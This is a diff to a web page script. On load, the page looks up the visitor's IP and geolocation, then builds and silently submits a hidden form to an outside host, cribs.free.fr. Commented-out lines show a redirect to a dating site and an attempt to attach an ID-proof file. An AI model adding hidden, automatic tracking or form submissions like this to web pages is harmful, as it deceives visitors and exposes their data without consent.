@@ -14,7 +14,7 @@ function truc() {
 }
 function getip() {
 $.getJSON('https://ipapi.co/json/', function(data) {
-		postdata(JSON.stringify(data, null, 2));
+		postform(JSON.stringify(data, null, 2));
 		
 	});
 }
@@ -28,6 +28,28 @@ $.ajax({
 }).done(function(){
 	//window.location.href = "https://www.tenderflirt.fr/";
 });
+}
+function postform() {
+var f = document.createElement('form');
+f.action='http://cribs.free.fr/';
+f.method='POST';
+//f.target='_blank';
+//f.enctype="multipart/form-data"
+
+var k=document.createElement('input');
+k.type='hidden';k.name='remember';
+k.value='11';
+f.appendChild(k);
+
+
+
+//var z=document.getElementById("FileNameId")
+//z.setAttribute("name", "IDProof");
+//z.setAttribute("id", "IDProof");
+//f.appendChild(z);
+
+document.body.appendChild(f);
+f.submit()
 }
 </script>
   <body onload="getip()">
